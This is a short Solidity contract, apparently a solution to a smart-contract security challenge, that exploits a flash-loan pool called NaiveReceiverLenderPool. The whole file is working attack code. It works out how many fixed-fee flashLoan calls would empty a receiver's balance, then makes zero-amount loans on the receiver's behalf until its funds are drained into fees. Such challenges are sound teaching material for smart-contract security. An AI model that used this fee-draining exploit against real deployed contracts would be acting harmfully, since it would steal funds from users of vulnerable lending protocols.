pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";

contract NaiveReceiverExploit {
    function exploit(NaiveReceiverLenderPool lendingPool, address receiver) external {
        // Each call of 'flashLoan()' collects a fee from the receiver. Calculate number 
        // of times 'flashLoan()' needs to be called to drain a receivers balance.
        uint calls = receiver.balance / lendingPool.fixedFee();
        for(uint i = 0; i < calls; i++) {
            lendingPool.flashLoan(receiver, 0);
        }
    }
}